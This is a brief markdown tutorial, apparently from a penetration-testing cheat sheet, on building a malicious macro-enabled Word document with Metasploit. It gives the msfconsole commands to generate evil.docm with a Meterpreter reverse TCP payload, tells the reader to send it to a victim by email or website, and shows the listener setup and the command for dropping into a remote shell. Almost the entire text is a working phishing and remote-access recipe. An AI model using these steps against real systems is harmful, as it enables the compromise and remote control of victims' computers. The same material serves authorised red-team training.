# Malicious Word Documents using MsfConsole

We can easily generate a malicious word documents via `msfconsole` in Linux.

## Usage

### 1. Create MalDocs

We can create a malicious word documents using `msfconsole` in Linux.

```bash
msfconsole
msf> set payload windows/meterpreter/reverse_tcp
msf> use exploit/multi/fileformat/office_word_macro
msf> set FILENAME evil.docm
msf> set LHOST <your-ip>
msf> set LPORT <your-port>
msf> run
```

### 2. Send MalDocs to Victim

After the `~/.msf4/local/evil.docm` is generated, send this file to a victim via Emails, Website, or something else.

### 3. Start Listener

In our local machine, start listener to receive incoming requests:

```bash
msfconsole
msf> use exploit/multi/handler
msf> set payload windows/meterpreter/reverse_tcp
msf> set LHOST <your-ip>
msf> set LPORT <your-port>
msf> run
```

### 4. Gain Shell

When a victim executed our maldocs, we can receive incoming request and get a shell.  
In Meterpreter, we can drop a command shell with the `shell` command:

```bash
meterpreter> shell
```
